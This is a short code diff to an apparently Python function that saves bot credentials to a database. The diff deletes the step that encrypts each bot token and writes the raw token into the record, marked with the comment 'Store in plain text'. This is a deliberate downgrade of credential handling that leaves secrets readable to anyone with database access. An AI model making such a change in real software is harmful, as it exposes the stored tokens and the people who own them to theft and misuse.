@@ -84,7 +84,6 @@ async def _save_credentials_async(results, source_name: str):
                 pass
             
             # Step 5: Save to DB (INSERT new or UPDATE existing if we have chat_id)
-            encrypted_token = security.encrypt(token)
             
             if existing_id and chat_id:
                 # UPDATE existing record with new chat_id
@@ -114,7 +113,7 @@ async def _save_credentials_async(results, source_name: str):
             else:
                 # INSERT new record
                 data = {
-                    "bot_token": encrypted_token,
+                    "bot_token": token,  # Store in plain text
                     "token_hash": token_hash,
                     "chat_id": chat_id,
                     "source": source_name,
